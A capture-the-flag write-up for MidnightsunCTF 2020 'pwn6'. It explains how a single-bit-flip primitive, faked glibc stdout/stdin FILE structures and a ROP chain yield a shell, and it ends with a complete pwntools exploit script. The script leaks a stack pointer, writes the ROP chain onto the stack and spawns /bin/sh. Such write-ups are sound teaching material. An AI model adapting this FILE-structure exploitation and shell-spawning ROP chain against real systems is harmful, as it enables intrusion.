---
layout: post
category: Pwn
title: MidnightsunCTF Quals 2020 - pwn6
tags: 
    - kowu
---

A static, no PIE, canary, AMD64 Binary, intended for pwny racing. Solved by faking glibc's stdin/out FILE structures and writing a ROPchain into stack memory.


[Download](/assets/bin/midnight_pwn6)


## Challenge Overview

At it's core, the challenge looked like this in pseudo-decompiled-C. We can swap a single bit at an arbitrary address.
```c
static volatile int loop;
while (loop < 1) {
    unsigned char* addr;
    unsigned int bitidx;
    printf("addr:");
    fscanf(stdin, "%p:%u", &addr, &bitidx);
    if (bitidx > 7)
        break;
    *addr ^= (1 << bitidx);
    loop++;
}
```

## Unlimited Swaps

First, define some helper functions to swap a bit, write a byte and a bytestring to some (previously null) memory. To get an unlimited amount of swaps, we overwrite the sign bit of the loop variable. As it is declared as volatile, it is reloaded on the next compare and loop < 1 holds true.

```python
def swapbitat(addr, bit):
    r.sendlineafter('addr:', '{}:{}'.format(hex(addr), bit))


def writebyte(addr, value):
    for idx in range(8):
        if (1 << idx) & value:
            swapbitat(addr, idx)


def writeto(addr, buf):
    for i in range(len(buf)):
        writebyte(addr + i, ord(buf[i]))

swapbitat(0x6D7333, 7)
```

## Leaking A Stack Pointer

stdin, stdout and stderr in C are pointers to some FILE struct. FILE is a typedef for `_IO_FILE`, which is defined in `struct_FILE.h`. Besides holding a fileno (i.e. stdin = 0, stdout = 1, ...), glibcs implementation does a lot of buffering on files as well (see the `setvbuf` kind of functions). There are slides of Angelboy available, which do descibe the thechiques I used in detail: e.g. <https://gsec.hitb.org/materials/sg2018/WHITEPAPERS/FILE%20Structures%20-%20Another%20Binary%20Exploitation%20Technique%20-%20An-Jie%20Yang.pdf>

tl;dr, by messing with `_IO_write_base`, `_IO_write_ptr` and `_IO_read_end` of `_IO_FILE` we can get arbitrary read. The following C snippet shows this behaviour:
```c
static char leakme[] = {'a', 'b', 'c', 'd'};
puts("test");
stdout->_IO_write_base = leakme;
stdout->_IO_write_ptr = &leakme[4];
stdout->_IO_read_end = stdout->_IO_write_base;
puts("test");
```
Output:
```
test
testabcd
```

However, we can't just overwrite the existing structure bit-by-bit, we would access corrupt pointers as stdin/out is accessed on every iteration of the loop. To solve this problem we swap a single bit inside of the stdout pointer (which is placed inside rw memory as well), so it points to some unused, zeroed out, rw space. Before we perform this "atomic stdout structure" swap of course we place a faked structure at this address.

```python
def fakestdout(a, b):
    return struct.pack('<28Q',
                       0x00000000fbad0800,
                       0x00000000006d53e3,
                       a,
                       0x00000000006d53e3,
                       a,
                       b,
                       0x00000000006d53e3,
                       0x00000000006d53e3,
                       0x00000000006d53e4,
                       0, 0, 0, 0, 0,
                       1,
                       0, 0,
                       0x00000000006d7d30,
                       0, 0, 0, 0, 0, 0, 0, 0, 0,
                       0x00000000006d6fe0)

writeto(0x006d7360, fakestdout(0x006d7da8, 0x006d7db0))
swapbitat(0x006d57a1, 5)
r.recvn(4)
stack = struct.unpack('<Q', r.recvn(8))[0]
print('stack at 0x{:x}'.format(stack))
swapbitat(0x006d57a1, 5)
```

We get some stack address leaked in return, and immediately change back stdout to the original struct by swapping the same bit again.

## Constructing A ROPchain

This part is easy, I used ROPgadget's automatic ropchain generation feature `ROPgadget.py --ropchain --binary pwn6`. For some reason it doesn't make use of a `pop rax; ret;` gadget for the syscall id, did it myself so it looks nicer.

## Arbitrary Write

Now we need to write our ropchain onto the stack. To get an arbitrary write we use the same technique we already used for leaking. This time we fake a stdin structure and let the "read buffer" point onto the stack by modifying `_IO_buf_base` and `_IO_buf_end`. As a result any stdlib call reading from stdin will "buffer" input wherever we want to.

To leave the loop, we send "000000:8" to trigger the break and start the ropchain. The many zeros are only placed there so it is a nice 8Bytes size.

## Final Sploit

```python
from pwn import *
from struct import pack

r = remote('pwn6-01.play.midnightsunctf.se', 10006)


def swapbitat(addr, bit):
    r.sendlineafter('addr:', '{}:{}'.format(hex(addr), bit))


def writebyte(addr, value):
    for idx in range(8):
        if (1 << idx) & value:
            swapbitat(addr, idx)


def writeto(addr, buf):
    for i in range(len(buf)):
        writebyte(addr + i, ord(buf[i]))


def fakestdout(a, b):
    return struct.pack('<28Q',
                       0x00000000fbad0800,
                       0x00000000006d53e3,
                       a,
                       0x00000000006d53e3,
                       a,
                       b,
                       0x00000000006d53e3,
                       0x00000000006d53e3,
                       0x00000000006d53e4,
                       0, 0, 0, 0, 0,
                       1,
                       0, 0,
                       0x00000000006d7d30,
                       0, 0, 0, 0, 0, 0, 0, 0, 0,
                       0x00000000006d6fe0)


def fakestdin(a, b):
    return struct.pack('<28Q',
                       0x00000000fbad208b,
                       0x00000000006d5603,
                       0x00000000006d5603,
                       0x00000000006d5603,
                       0x00000000006d5603,
                       0x00000000006d5603,
                       0x00000000006d5603,
                       a,
                       b,
                       0, 0, 0, 0, 0,
                       0,
                       0, 0,
                       0x00000000006d7d40,
                       0, 0, 0, 0, 0, 0, 0, 0, 0,
                       0x00000000006d6fe0)


def rop():
    p = pack('<Q', 0x00449b46) * 0x10  # ret
    p += pack('<Q', 0x0000000000410433)  # pop rsi ; ret
    p += pack('<Q', 0x00000000006d50e0)  # @ .data
    p += pack('<Q', 0x00000000004158a4)  # pop rax ; ret
    p += '/bin//sh'
    p += pack('<Q', 0x0000000000487b51)  # mov qword ptr [rsi], rax ; ret
    p += pack('<Q', 0x0000000000410433)  # pop rsi ; ret
    p += pack('<Q', 0x00000000006d50e8)  # @ .data + 8
    p += pack('<Q', 0x0000000000444e00)  # xor rax, rax ; ret
    p += pack('<Q', 0x0000000000487b51)  # mov qword ptr [rsi], rax ; ret
    p += pack('<Q', 0x00000000004006a6)  # pop rdi ; ret
    p += pack('<Q', 0x00000000006d50e0)  # @ .data
    p += pack('<Q', 0x0000000000410433)  # pop rsi ; ret
    p += pack('<Q', 0x00000000006d50e8)  # @ .data + 8
    p += pack('<Q', 0x0000000000449af5)  # pop rdx ; ret
    p += pack('<Q', 0x00000000006d50e8)  # @ .data + 8
    p += pack('<Q', 0x00000000004158a4)  # pop rax
    p += pack('<Q', 59)
    p += pack('<Q', 0x000000000040130c)  # syscall
    return p


def sploit():
    # unlimited swaps
    swapbitat(0x6D7333, 7)

    # create fake file struct to leak a stack ptr
    writeto(0x006d7360, fakestdout(0x006d7da8, 0x006d7db0))

    # detour & restore stdout to/from fake file struct
    swapbitat(0x006d57a1, 5)
    r.recvn(4)
    stack = struct.unpack('<Q', r.recvn(8))[0]
    print('stack at 0x{:x}'.format(stack))
    swapbitat(0x006d57a1, 5)

    # create fake file struct to smash the stack
    writeto(0x6d7580, fakestdin(stack - 0x138, stack + len(rop())))
    swapbitat(0x006d57a9, 5)
    r.sendlineafter('addr:', '000000:8' + rop())

    r.interactive()


if __name__ == '__main__':
    sploit()
```
